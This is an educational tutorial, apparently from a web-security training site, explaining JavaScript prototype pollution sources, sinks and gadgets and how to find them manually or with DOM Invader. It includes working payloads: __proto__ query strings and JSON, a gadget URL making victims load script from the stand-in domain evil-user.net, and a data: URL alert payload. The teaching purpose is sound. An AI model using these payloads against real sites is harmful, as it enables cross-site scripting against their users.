
# What is Prototype Pollution?

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects. 

# What is an Object in Javascript?

A JavaScript object is essentially just a collection of `key:value ` pairs known as "properties". 

For example, the following object could represent a user:

```js
const user = { username: "wiener", userId: 01234, isAdmin: false }
```

You can access the properties of an object by using either dot notation or bracket notation to refer to their respective keys:

``` js
user.username // "wiener" user['userId'] // 01234
```

As well as data, properties may also contain executable functions. In this case, the function is known as a "method".

``` js
const user = { 
	username: "wiener", 
	userId: 01234, 
	exampleMethod: function(){ // do something }
}
```

The example above is an "object literal", which means it was created using curly brace syntax to explicitly declare its properties and their initial values. However, it's important to understand that almost everything in JavaScript is an object under the hood. Throughout these materials, the term "object" refers to all entities, not just object literals.

# Accessing an object's prototype using `__proto__`

Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, `__proto__` is the de facto standard used by most browsers. If you're familiar with object-oriented languages, this property serves as both a getter and setter for the object's prototype. This means you can use it to read the prototype and its properties, and even reassign them if necessary.

As with any property, you can access `__proto__` using either bracket or dot notation:

```js
username.__proto__ 
username['__proto__']
```

You can even chain references to `__proto__` to work your way up the prototype chain:

``` js
username.__proto__ // String.prototype 
username.__proto__.__proto__ // Object.prototype 
username.__proto__.__proto__.__proto__ // null
```

# How do prototype pollution vulnerabilities arise?

Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.

Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.

It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype`.

Successful exploitation of prototype pollution requires the following key components:

- A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.

- A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.

- An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

# Prototype pollution sources

A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:

- The URL via either the query or fragment string (hash)

- JSON-based input

- Web messages


## Prototype pollution via the URL

Consider the following URL, which contains an attacker-constructed query string:

`https://vulnerable-website.com/?__proto__[evilProperty]=payload`

When breaking the query string down into `key:value` pairs, a URL parser may interpret `__proto__` as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.

You might think that the `__proto__` property, along with its nested `evilProperty`, will just be added to the target object as follows:

`{ existingProperty1: 'foo', existingProperty2: 'bar', __proto__: { evilProperty: 'payload' } }`

However, this isn't the case. At some point, the recursive merge operation may assign the value of `evilProperty` using a statement equivalent to the following:

`targetObject.__proto__.evilProperty = 'payload';`

During this assignment, the JavaScript engine treats `__proto__` as a getter for the prototype. As a result, `evilProperty` is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default `Object.prototype`, all objects in the JavaScript runtime will now inherit `evilProperty`, unless they already have a property of their own with a matching key.

In practice, injecting a property called `evilProperty` is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.

## Prototype pollution via JSON input

User-controllable objects are often derived from a JSON string using the `JSON.parse()` method. Interestingly, `JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`. This provides another potential vector for prototype pollution.

Let's say an attacker injects the following malicious JSON, for example, via a web message:

`{ "__proto__": { "evilProperty": "payload" } }`

If this is converted into a JavaScript object via the `JSON.parse()` method, the resulting object will in fact have a property with the key `__proto__`:

`const objectLiteral = {__proto__: {evilProperty: 'payload'}}; const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}'); objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true`

If the object created via `JSON.parse()` is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example.

## Finding client-side prototype pollution sources manually

Finding prototype pollution sources manually is largely a case of trial and error. In short, you need to try different ways of adding an arbitrary property to `Object.prototype` until you find a source that works.

When testing for client-side vulnerabilities, this involves the following high-level steps:

1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example:
    
    `vulnerable-website.com/?__proto__[foo]=bar`
2. In your browser console, inspect `Object.prototype` to see if you have successfully polluted it with your arbitrary property:
    
    `Object.prototype.foo // "bar" indicates that you have successfully polluted the prototype // undefined indicates that the attack was not successful`
3. If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa:
    
    `vulnerable-website.com/?__proto__.foo=bar`
4. Repeat this process for each potential source.

## Finding client-side prototype pollution sources using DOM Invader

As you can see, finding prototype pollution sources manually can be a fairly tedious process. Instead, we recommend using DOM Invader, which comes preinstalled with Burp's built-in browser. DOM Invader is able to automatically test for prototype pollution sources as you browse, which can save you a considerable amount of time and effort.
# Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.

As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.

# Prototype pollution gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

- Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.

- Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.


A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. Robust websites may also explicitly set the prototype of the object to `null`, which ensures that it doesn't inherit any properties at all.

## Example of a prototype pollution gadget

Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:

`let transport_url = config.transport_url || defaults.transport_url;`

Now imagine the library code uses this `transport_url` to add a script reference to the page:

``let script = document.createElement('script'); script.src = `${transport_url}/example.js`; document.body.appendChild(script);``

If the website's developers haven't set a `transport_url` property on their `config` object, this is a potential gadget. In cases where an attacker is able to pollute the global `Object.prototype` with their own `transport_url` property, this will be inherited by the `config` object and, therefore, set as the `src` for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:

`https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net`

By providing a `data:` URL, an attacker could also directly embed an XSS payload within the query string as follows:

`https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//`

Note that the trailing `//` in this example is simply to comment out the hardcoded `/example.js` suffix.


## Finding client-side prototype pollution gadgets manually

Once you've identified a source that lets you add arbitrary properties to the global `Object.prototype`, the next step is to find a suitable gadget that you can use to craft an exploit. In practice, we recommend using DOM Invader to do this, but it's useful to look at the manual process as it may help solidify your understanding of the vulnerability.

1. Look through the source code and identify any properties that are used by the application or any libraries that it imports.

2. In Burp, enable response interception (**Proxy > Options > Intercept server responses**) and intercept the response containing the JavaScript that you want to test.

3. Add a `debugger` statement at the start of the script, then forward any remaining requests and responses.

4. In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.

5. While the script is still paused, switch to the console and enter the following command, replacing `YOUR-PROPERTY` with one of the properties that you think is a potential gadget:

    `Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', { get() { console.trace(); return 'polluted'; } })`

    The property is added to the global `Object.prototype`, and the browser will log a stack trace to the console whenever it is accessed.

6. Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.

7. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.

8. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`.

9. Repeat this process for any properties that you think are potential gadgets.

## Finding client-side prototype pollution gadgets using DOM Invader

As you can see from the previous steps, manually identifying prototype pollution gadgets in the wild can be a laborious task. Given that websites often rely on a number of third-party libraries, this may involve reading through thousands of lines of minified or obfuscated code, which makes things even trickier. DOM Invader can automatically scan for gadgets on your behalf and can even generate a DOM XSS proof-of-concept in some cases. This means you can find exploits on real-world sites in a matter of seconds rather than hours.